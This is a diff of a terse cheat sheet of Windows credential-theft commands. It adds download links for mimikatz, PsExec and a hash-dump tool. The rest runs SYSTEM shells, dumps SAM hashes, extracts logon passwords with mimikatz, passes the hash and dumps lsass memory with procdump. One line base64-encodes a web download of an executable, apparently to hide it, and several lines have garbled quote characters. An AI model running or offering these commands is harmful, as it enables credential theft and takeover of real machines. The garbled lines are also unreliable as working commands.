@@ -1,3 +1,6 @@
+https://github.com/gentilkiwi/mimikatz/releases‚Äã
+https://docs.microsoft.com/en-us/sysinternals/downloads/psexec ‚Äã
+http://4f2bcn3u2m2u2z7ghc17a5jm.wpengine.netdna-cdn.com/wp-content/uploads/2016/09/cqhashdumpv2.zip 
 psexec -s -i -d cmd.exe
 CQHashDumpV2 /samdump
 mimikatz # privilege::debug
@@ -6,7 +9,7 @@ mimikatz # sekurlsa::logonpasswords
 mimikatz # sekurlsa::pth /user:akdamin /domain:localhost /ntlm:
 Whoami
 Hostname
-$tool=îInvoke-WebRequest†-OutFile c:\temp\pd.exeî
+$tool=‚ÄùInvoke-WebRequest¬†-OutFile c:\temp\pd.exe‚Äù
 $base64=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($tool))
 $base64
 \procdump.exe -accepteula -ma lsass.exe
